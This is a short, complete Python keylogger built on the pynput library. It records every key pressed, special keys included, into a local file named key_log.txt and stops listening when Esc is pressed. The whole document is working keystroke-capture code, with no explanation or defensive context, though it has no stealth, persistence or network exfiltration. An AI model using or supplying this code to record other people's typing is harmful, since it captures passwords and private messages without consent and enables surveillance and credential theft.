from pynput import keyboard

# Log file name
log_file = "key_log.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., enter, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on 'Esc' key
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()